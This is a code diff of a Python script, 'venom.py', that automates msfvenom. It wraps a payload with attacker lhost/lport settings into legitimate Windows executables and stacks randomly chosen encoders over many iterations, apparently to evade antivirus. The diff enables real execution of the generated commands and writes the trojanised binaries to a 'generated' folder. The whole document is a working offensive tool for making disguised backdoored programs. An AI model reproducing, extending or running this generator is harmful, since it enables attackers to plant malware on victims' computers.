@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-q.py
+venom.py
 Artur Matias
 2021-06-28
 
@@ -12,8 +12,11 @@ import os
 import random
 
 def banner():
+
+    os.system("clear")
     print("#------------------------------------------------------------------------------#") 
     print("|        Artur Matias                                        2021-08-01        |")
+    print("|                              MSFVenom Generator                              |")
     print("#------------------------------------------------------------------------------#")
 
 def generate_venom(n_file, n_raws, n_exe):
@@ -30,8 +33,8 @@ def generate_venom(n_file, n_raws, n_exe):
                 venom += raw()
             venom += venom_end(n_file, n_exe)
 
-        print("\nExecuting:\n" + venom)
-        #os.system(venom)
+        print("\nExecuting:\n" + venom + "\n")
+        os.system(venom)
 
     except Exception as e:
         print("Failed:", e)
@@ -46,44 +49,53 @@ def run(n_files):
 
 def venom_single(n_file, n_exe):
     venom_single = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
+    
     return venom_single
 
 
 def venom_start():
     venom_start = "msfvenom -a " + arch + " --platform " + platform + " -p " + payload + " lhost=" + lhost + " lport=" + lport + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
+    
     return venom_start
 
 
 def raw():
     raw = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -f raw"
+    
     return raw
 
 
 def venom_end(n_file, n_exe):
     venom_end = " | msfvenom -a " + arch + " --platform " + platform + " -e " + r_encoder() + " -i " + r_iterations() + " -x ./" + arch + "/" + executable[n_exe] + ".exe -f " + f + " -o ./generated/" + executable[n_exe] + "-" + arch + "-" + str(n_file) + ".exe"
+    
     return venom_end
 
 
 def r_encoder():
     r = random.choice(encoders)
+    
     return r
 
 
 def r_iterations():
     r = str(random.randint(1, max_r_iterations))
+    
     return r
 
 
 def r_raws():
     r = random.randint(1, max_r_raw)
+    
     return r
 
 
 def get_arch():
+
+    print("\n" + "#"*80 + "\n")
     print("What architecture is the executable?")
     print("1 - x86")
-    print("2 - x64\n")
-    answer = input('> ')
+    print("2 - x64")
+    answer = input('\n> ')
     
     if answer == '1':
         arch = 'x86'
@@ -139,15 +151,17 @@ def get_executable(arch):
 
 def choose_executable(executable):
 
-    print("Do you want to generate a copy of a single exe or all exes?")
-    print("1 - Single exe")
-    print("2 - All exes\n")
-    answer = input('> ')
+    print("\n" + "#"*80 + "\n")
+    print("Do you want to generate a copy of a single or all executables?")
+    print("1 - Single executable")
+    print("2 - All executables")
+    answer = input('\n> ')
     
     if answer == '1':
         print_executables(executable)
+        print("\n" + "#"*80 + "\n")
         print("Choose the executable by number:")
-        choice = input('> ')
+        choice = input('\n> ')
         choice = int(choice)
         if choice >= 0 and choice <= len(executable):
             executable = [executable[choice]]
@@ -161,9 +175,6 @@ def choose_executable(executable):
         print("Invalid option!\n")
         choose_executable(executable)
 
-    print("AAAHHHHH")
-    print(executable)
-
     return executable
 
 
@@ -175,7 +186,8 @@ def get_encoders():
         # No low or manual rank
         encoders = ["x86/shikata_ga_nai", "x86/countdown", "x86/fnstenv_mov"]
     elif arch == "x64":
-        encoders = ["x64/xor", "x64/xor_context", "x64/xor_dynamic", "x64/zutto_dekiru"]
+        encoders = ["x64/xor", "x64/xor_context", "x64/xor_dynamic",
+                    "x64/zutto_dekiru"]
     
     return encoders
 
@@ -190,10 +202,12 @@ def get_format():
 
 
 def get_n_files():
-    # How many executables will be generated
-    print("\nHow many files do you want to generate?")
-    answer = input('> ')
     n_files = 0
+
+    print("\n" + "#"*80 + "\n")
+    # How many executables will be generated
+    print("How many files do you want to generate?")
+    answer = input('\n> ')
 
     try:
         n_files = int(answer)
@@ -204,10 +218,10 @@ def get_n_files():
     
     return n_files
 
-def print_options(arch, platform, payload, lhost, lport, f, encoders, executable):
+def print_options(arch, platform, payload, lhost, lport, f, encoders, executable, n_files):
 
-    print("\n" + "#"*80)
-    print("\n\tOptions:\n")
+    print("\n" + "#"*80 + "\n")
+    print("Options:\n")
     print("Architecture:\t", arch)
     print("platform:\t", platform)
     print("payload:\t", payload)
@@ -215,16 +229,15 @@ def print_options(arch, platform, payload, lhost, lport, f, encoders, executable
     print("lport:\t\t", lport)
     print("format:\t\t", f)
     print("encoders:\t", encoders)
-    print("executables:\t", executable)
-    print("\n" + "#"*80)
+    print("executables:\t", executable, "*", n_files)
 
 def print_executables(executable):
 
-    print("\n\tList of executables:\n")
+    print("\n" + "#"*80 + "\n")
+    print("List of executables:\n")
 
     for index,exe in enumerate(executable):
         print(str(index) + " - " + exe + ".exe")
-    print("\n" + "#"*80)
 
 
 if __name__ == "__main__":
@@ -241,20 +254,22 @@ if __name__ == "__main__":
     f = get_format()
 
     # Max random raw sequences
-    max_r_raw = 3
+    max_r_raw = 1
 
     # Max random iterations per raw
-    max_r_iterations = 200
+    max_r_iterations = 20
 
-    print_options(arch, platform, payload, lhost, lport, f, encoders, executable)
     executable = choose_executable(executable)
-
     n_files = get_n_files()
+    print_options(arch, platform, payload, lhost, lport, f, encoders, executable, n_files)
 
-    print("\nExecute? [y/n]")
-    start = input("> ")
+
+    print("\n" + "#"*80 + "\n")
+
+    print("Execute? [y/n]")
+    start = input('\n> ')
     
-    if start == "y":
+    if start == "y" or start == "Y":
         run(n_files)
     else:
         print("Bye!")
